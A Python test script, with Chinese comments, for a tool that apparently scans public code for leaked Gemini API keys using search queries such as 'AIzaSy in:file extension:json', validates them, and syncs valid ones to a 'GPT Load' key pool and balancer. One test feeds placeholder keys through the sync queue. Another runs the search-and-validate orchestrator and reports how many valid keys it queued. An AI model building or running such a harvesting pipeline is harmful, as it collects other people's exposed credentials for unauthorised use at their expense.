#!/usr/bin/env python3
"""
测试GPT Load集成功能
验证找到的Gemini密钥是否能正确同步到GPT Load系统
"""

import os
import sys
import asyncio
import logging
from pathlib import Path

# 添加项目根目录到Python路径
sys.path.insert(0, str(Path(__file__).parent))

from app.core.orchestrator import Orchestrator, OrchestrationConfig
from app.core.scanner import Scanner
from app.core.validator import KeyValidator
from app.services.config_service import get_config_service
from utils.sync_utils import sync_utils
from common.Logger import setup_logger

# 设置日志
setup_logger()
logger = logging.getLogger(__name__)


def test_gpt_load_sync():
    """测试GPT Load同步功能"""
    logger.info("=" * 60)
    logger.info("🧪 测试GPT Load集成功能")
    logger.info("=" * 60)
    
    # 获取配置服务
    config_service = get_config_service()
    
    # 检查GPT Load配置
    gpt_load_enabled = config_service.get("GPT_LOAD_SYNC_ENABLED", False)
    gpt_load_url = config_service.get("GPT_LOAD_URL", "")
    gpt_load_auth = config_service.get("GPT_LOAD_AUTH", "")
    gpt_load_groups = config_service.get("GPT_LOAD_GROUP_NAMES", [])
    
    logger.info(f"📋 GPT Load配置状态:")
    logger.info(f"   启用状态: {gpt_load_enabled}")
    logger.info(f"   服务器URL: {gpt_load_url if gpt_load_url else '未配置'}")
    logger.info(f"   认证信息: {'已配置' if gpt_load_auth else '未配置'}")
    logger.info(f"   目标组: {', '.join(gpt_load_groups) if gpt_load_groups else '未配置'}")
    
    if not gpt_load_enabled:
        logger.warning("⚠️ GPT Load同步未启用，请在配置中设置 GPT_LOAD_SYNC_ENABLED=true")
        return
    
    if not all([gpt_load_url, gpt_load_auth, gpt_load_groups]):
        logger.error("❌ GPT Load配置不完整，请检查 GPT_LOAD_URL, GPT_LOAD_AUTH 和 GPT_LOAD_GROUP_NAME")
        return
    
    # 测试添加密钥到同步队列
    test_keys = [
        "AIzaSyTest1234567890abcdefghijklmnopqrst",  # 测试密钥1
        "AIzaSyTest2234567890abcdefghijklmnopqrst",  # 测试密钥2
        "AIzaSyTest3234567890abcdefghijklmnopqrst",  # 测试密钥3
    ]
    
    logger.info(f"\n🔄 测试添加 {len(test_keys)} 个密钥到GPT Load同步队列...")
    
    try:
        # 添加密钥到队列
        sync_utils.add_keys_to_queue(test_keys)
        logger.info("✅ 密钥已成功添加到同步队列")
        
        # 等待同步完成（sync_utils有60秒的批量发送间隔）
        logger.info("⏳ 等待同步任务执行（最多60秒）...")
        
        # 检查队列状态
        from utils.file_manager import checkpoint
        
        initial_balancer_count = len(checkpoint.wait_send_balancer)
        initial_gpt_count = len(checkpoint.wait_send_gpt_load)
        
        logger.info(f"📊 当前队列状态:")
        logger.info(f"   Balancer队列: {initial_balancer_count} 个密钥")
        logger.info(f"   GPT Load队列: {initial_gpt_count} 个密钥")
        
        # 手动触发批量发送（用于测试）
        logger.info("\n🚀 手动触发批量发送...")
        sync_utils._batch_send_worker()
        
        # 再次检查队列状态
        final_balancer_count = len(checkpoint.wait_send_balancer)
        final_gpt_count = len(checkpoint.wait_send_gpt_load)
        
        logger.info(f"\n📊 发送后队列状态:")
        logger.info(f"   Balancer队列: {final_balancer_count} 个密钥")
        logger.info(f"   GPT Load队列: {final_gpt_count} 个密钥")
        
        if final_gpt_count < initial_gpt_count:
            logger.info(f"✅ 成功发送 {initial_gpt_count - final_gpt_count} 个密钥到GPT Load")
        else:
            logger.warning("⚠️ 密钥可能未成功发送，请检查日志")
        
    except Exception as e:
        logger.error(f"❌ 测试失败: {e}", exc_info=True)


async def test_orchestrator_with_gpt_load():
    """测试Orchestrator与GPT Load的集成"""
    logger.info("\n" + "=" * 60)
    logger.info("🧪 测试Orchestrator与GPT Load集成")
    logger.info("=" * 60)
    
    try:
        # 创建扫描器和验证器
        scanner = Scanner()
        validator = KeyValidator()
        
        # 创建协调器配置
        config = OrchestrationConfig(
            max_concurrent_searches=2,
            max_concurrent_validations=5,
            enable_async=True
        )
        
        # 创建协调器
        orchestrator = Orchestrator(scanner, validator, config)
        
        # 测试查询
        test_queries = [
            "AIzaSy in:file extension:json",
            "gemini api key in:file",
        ]
        
        logger.info(f"🔍 开始搜索，查询数: {len(test_queries)}")
        logger.info(f"🔗 GPT Load同步: {'启用' if orchestrator.gpt_load_enabled else '禁用'}")
        
        # 运行协调器（只运行1轮）
        stats = await orchestrator.run(test_queries, max_loops=1)
        
        # 显示统计
        logger.info(f"\n📊 搜索统计:")
        logger.info(f"   处理的查询: {stats.total_queries_processed}")
        logger.info(f"   处理的项目: {stats.total_items_processed}")
        logger.info(f"   找到的密钥: {stats.total_keys_found}")
        logger.info(f"   有效密钥: {stats.total_valid_keys}")
        
        if orchestrator.gpt_load_enabled and stats.total_valid_keys > 0:
            logger.info(f"✅ 找到 {stats.total_valid_keys} 个有效密钥并添加到GPT Load同步队列")
        
    except Exception as e:
        logger.error(f"❌ 测试失败: {e}", exc_info=True)


def main():
    """主函数"""
    try:
        # 测试基本的GPT Load同步功能
        test_gpt_load_sync()
        
        # 测试Orchestrator集成
        # asyncio.run(test_orchestrator_with_gpt_load())
        
        logger.info("\n" + "=" * 60)
        logger.info("✅ GPT Load集成测试完成")
        logger.info("=" * 60)
        
    except KeyboardInterrupt:
        logger.info("\n⛔ 测试被用户中断")
    except Exception as e:
        logger.error(f"❌ 测试失败: {e}", exc_info=True)
    finally:
        # 清理
        sync_utils.shutdown()


if __name__ == "__main__":
    main()